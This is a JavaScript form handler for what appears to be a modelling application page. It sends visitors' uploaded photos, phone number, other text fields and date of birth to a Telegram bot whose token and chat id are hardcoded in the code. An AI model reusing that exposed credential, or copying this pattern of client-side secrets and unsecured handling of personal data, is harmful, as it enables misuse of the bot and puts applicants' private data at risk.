const form = document.querySelector("form");
const files = form.querySelectorAll("input[type=file]");
const textInputs = form.querySelectorAll(
  "input[type=text], input[type=tel], select"
);

async function sendImg(file) {
  const userId = "-4199673025";
  const token = "7015438809:AAHGAoDbtgLBCLG9-X2oxKvEqfIwjXCmxH8";
  const url = `https://api.telegram.org/bot${token}/sendPhoto`;
  const formData = new FormData();
  formData.append("chat_id", userId);
  formData.append("photo", file, "photo.*");
  return fetch(url, { method: "POST", body: formData });
}

async function sendTextData(data) {
  const userId = "-4199673025";
  const token = "7015438809:AAHGAoDbtgLBCLG9-X2oxKvEqfIwjXCmxH8";
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const formData = new FormData();
  formData.append("chat_id", userId);
  formData.append("text", data);
  return fetch(url, { method: "POST", body: formData });
}

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  // Відправляємо фотографії
  const imgPromises = Array.from(files).map((file) => {
    if (file.files[0]) {
      return sendImg(file.files[0]);
    }
  });

  // Очікуємо завершення всіх відправлень фотографій
  await Promise.all(imgPromises);

  // Збираємо текстові дані форми
  let formData = "";
  textInputs.forEach((input) => {
    formData += `${input.name}: ${input.value}\n`;
  });

  // Отримуємо значення поля дати народження і додаємо його до formData
  const dateOfBirth = document.getElementById("Date-of-Birth").value;
  formData += `Date_of_Birth: ${dateOfBirth}\n`;

  // Відправляємо текстові дані форми
  await sendTextData(formData);

  // Перенаправляємо на сторінку
  const currentPath = window.location.pathname;

  if (currentPath.includes("you-are-model-ua")) {
    window.location.replace("confirmation-ua.html");
  } else {
    window.location.replace("confirmation.html");
  }
});

files.forEach((file) => {
  file.onchange = () => {
    const block = file.closest(".upload-block");
    const text = block.querySelector(".upload-text");
    const img = block.querySelector("img");
    text.textContent = text.getAttribute("data-text");
    img.src = URL.createObjectURL(file.files[0]);
  };
});
